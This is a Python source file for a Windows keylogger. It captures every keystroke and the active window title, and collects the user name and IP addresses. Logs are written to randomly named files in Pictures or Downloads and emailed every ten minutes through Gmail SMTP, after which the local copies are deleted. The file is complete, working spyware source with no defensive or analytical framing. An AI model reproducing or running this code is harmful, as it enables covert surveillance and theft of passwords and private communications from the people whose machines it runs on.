from pynput.keyboard import Key, Listener
import win32gui
import os
import time
import requests
import socket
import random
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import threading
import config


class keylog:
    def __init__(self):
        self.dateTime = time.ctime(time.time())
        self.user = os.path.expanduser('~').split('\\')[2]
        self.publicIP = requests.get('https://api.ipify.org').text
        self.privateIP = socket.gethostbyname(socket.gethostname())

        self.msg = f'[START OF LOGS]\n  > Date/Time: {self.dateTime}\n  > User-Profile: {self.user}\n  > Public-IP: {self.publicIP}\n  > Private-IP: {self.privateIP}\n\n '
        self.loggedData = [self.msg]

        self.oldApp = ''
        self.newApp = None
        self.deleteFile = []

        self.one = os.path.expanduser('~') + '/Pictures/'
        self.two = os.path.expanduser('~') + '/Downloads/'

        self.fromAddr = config.fromAddr
        self.fromPswd = config.fromPswd
        self.toAddr = self.fromAddr

    def onPress(self, key):
        self.newApp = win32gui.GetWindowText(win32gui.GetForegroundWindow())

        if self.newApp == 'Cortana':
            self.newApp = 'Windows Start Menu'
        else:
            pass

        if self.newApp != self.oldApp and self.newApp != '':
            self.loggedData.append(f'[{self.dateTime}] ~ {self.newApp}\n')
            self.oldApp = self.newApp
        else:
            pass

        substitution = {
            'Key.enter': '[ENTER]\n',
            'Key.backspace': '[BACKSPACE]',
            'Key.space': ' ',
            'Key.alt_l': '[ALT]',
            'Key.tab': '[TAB]',
            'Key.delete': '[DEL]',
            'Key.ctrl_l': '[CTRL]',
            'Key.left': '[LEFT ARROW]',
            'Key.right': '[RIGHT ARROW]',
            'Key.shift': '[SHIFT]',
            '\\x13': '[CTRL+S]',
            '\\x17': '[CTRL+W]',
            'Key.caps_lock': '[CAPS LK]',
            '\\x01': '[CTRL+A]',
            'Key.cmd': '[WINDOWS KEY]',
            'Key.print_screen': '[PRT SCR]',
            '\\x03': '[CTRL+C]',
            '\\x16': '[CTRL+V]'
        }

        key = str(key).strip('\'')
        if key in substitution:
            self.loggedData.append(substitution[key])
        else:
            self.loggedData.append(key)

    def writeFile(self, count):
        pathList = [self.one, self.two]

        filePath = random.choice(pathList)
        fileName = str(count) + 'I' + str(random.randint(1000000, 9999999)) + '.txt'
        file = filePath + fileName
        print(file)
        self.deleteFile.append(file)

        with open(file, 'w') as fp:
            fp.write(''.join(self.loggedData))
        print('written all data')

    def sendLogs(self):
        count = 0

        time.sleep(600)
        while True:
            if len(self.loggedData) > 1:
                try:
                    self.writeFile(count)

                    subject = f'[{self.user}] ~ {count}'

                    msg = MIMEMultipart()
                    msg['From'] = self.fromAddr
                    msg['To'] = self.toAddr
                    msg['Subject'] = subject
                    body = f'Keylog report of {self.user}'
                    msg.attach(MIMEText(body, 'plain'))

                    attachment = open(self.deleteFile[0], 'rb')
                    print('attachment')

                    fileName = self.deleteFile[0].split('/')[2]

                    part = MIMEBase('application', 'octect-stream')
                    part.set_payload(attachment.read())
                    encoders.encode_base64(part)
                    part.add_header('content-disposition', 'attachment;fileName=' + str(fileName))
                    msg.attach(part)

                    text = msg.as_string()
                    print('test msg.as_string')

                    s = smtplib.SMTP('smtp.gmail.com', 587)
                    s.ehlo()
                    s.starttls()
                    print('starttls')
                    s.ehlo()
                    s.login(self.fromAddr, self.fromPswd)
                    s.sendmail(self.fromAddr, self.toAddr, text)
                    print('sent mail')
                    attachment.close()
                    s.close()

                    os.remove(self.deleteFile[0])
                    del self.loggedData[1:]
                    del self.deleteFile[0:]
                    print('delete data/files')

                    count += 1

                except Exception as e:
                    print('[!] sendLogs // Error.. ~ %s' % e)
                    pass


if __name__ == '__main__':
    k = keylog()
    T1 = threading.Thread(target=k.sendLogs)
    T1.start()

    with Listener(on_press=k.onPress) as listener:
        listener.join()
